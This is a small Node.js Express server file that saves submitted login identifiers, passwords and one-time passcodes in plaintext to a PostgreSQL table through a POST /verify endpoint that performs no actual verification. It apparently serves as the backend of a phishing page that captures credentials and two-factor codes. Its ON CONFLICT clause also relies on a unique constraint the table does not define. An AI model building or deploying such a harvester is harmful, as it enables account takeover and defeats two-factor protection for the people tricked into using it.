require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Create table if it doesn't exist
pool.query(`
  CREATE TABLE IF NOT EXISTS users(
    id SERIAL PRIMARY KEY,
    email VARCHAR(255),
    phone VARCHAR(20),
    password VARCHAR(255),
    otp VARCHAR(10)
  )
`);

// Save login + OTP
app.post('/verify', async (req, res) => {
  const { identifier, password, otp } = req.body;

  try {
    const result = await pool.query(
      `INSERT INTO users (email, password, otp)
       VALUES ($1, $2, $3)
       ON CONFLICT (email) DO UPDATE SET password = $2, otp = $3`,
      [identifier, password, otp]
    );

    res.json({ success: true, message: "Login + OTP saved successfully!" });
  } catch (err) {
    console.error("DB ERROR:", err);
    res.json({ success: false, message: "Server error" });
  }
});

app.listen(process.env.PORT || 5000, () =>
  console.log("🔥 Server running...")
);
